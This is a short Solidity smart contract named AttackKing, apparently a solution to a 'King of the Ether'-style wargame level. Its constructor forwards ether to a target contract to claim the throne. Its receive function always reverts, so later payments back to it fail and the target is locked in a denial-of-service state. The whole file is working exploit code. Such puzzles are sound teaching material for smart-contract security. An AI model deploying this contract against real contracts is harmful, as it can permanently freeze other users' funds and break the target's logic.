pragma solidity ^0.8.0;

contract AttackKing{
	constructor(address payable _sendTo) payable {
	    require(msg.value >= 1000000000000000, "please send > 0.001 ether");
		(bool success, ) = _sendTo.call{value:msg.value}("");
        require(success, "external call failed");
	}
	receive() external payable {
		revert();
	}
}
